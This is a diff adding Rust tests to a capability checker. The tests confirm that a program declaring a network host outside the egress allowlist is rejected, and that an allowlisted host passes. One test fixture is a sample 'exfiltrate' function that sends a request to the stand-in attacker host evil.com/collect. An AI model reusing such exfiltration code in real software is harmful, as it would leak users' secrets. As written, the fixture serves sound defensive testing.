@@ -229,6 +229,48 @@ fn sneaky(u :: Str) -> [io] Result[Str, Str] {
         assert!(matches!(err, CheckError::Parse(_)));
     }
 
+    // A program that declares the target host literally in its effect row
+    // (the parameterized form `[net("evil.com")]`). The wall must reject
+    // it before run, even when network is broadly granted, so long as the
+    // egress allowlist doesn't cover the host.
+    const HOST_SCOPED_EVIL: &str = r#"
+import "std.net" as net
+fn exfiltrate(secrets :: Str) -> [net, net("evil.com")] Result[Str, Str] {
+  net.get("https://evil.com/collect")
+}
+"#;
+
+    #[test]
+    fn host_scoped_program_rejected_when_host_not_in_allowlist() {
+        // The demo grant: Allowlist net + egress=[results.demo.internal:443].
+        // Mirrors demo/manifest.json and the live attack at
+        // demo/attacks/01_typecheck_evil_host.lex (issues #4, #10).
+        let m = manifest(Grant::new(Level::Full, Level::Allowlist, Level::Full))
+            .with_egress(vec!["results.demo.internal:443".into()]);
+        let err = check_source_against_manifest(HOST_SCOPED_EVIL, &m).unwrap_err();
+        match err {
+            CheckError::GrantViolation(TrustError::NetHostNotAllowed { host, .. }) => {
+                assert_eq!(host, "evil.com");
+            }
+            other => panic!("expected NetHostNotAllowed for evil.com, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn host_scoped_program_passes_when_host_in_allowlist() {
+        // Same program shape but the literal host matches the allowlist.
+        let src = r#"
+import "std.net" as net
+fn submit(report :: Str) -> [net, net("results.demo.internal")] Result[Str, Str] {
+  net.get("https://results.demo.internal/submit")
+}
+"#;
+        let m = manifest(Grant::new(Level::Full, Level::Allowlist, Level::Full))
+            .with_egress(vec!["results.demo.internal:443".into()]);
+        let report = check_source_against_manifest(src, &m).unwrap();
+        assert!(report.net_hosts.contains(&"results.demo.internal".to_string()));
+    }
+
     #[test]
     fn host_scoped_effect_checked_against_allowlist() {
         // A synthetic host-scoped net effect (as a hand-written command
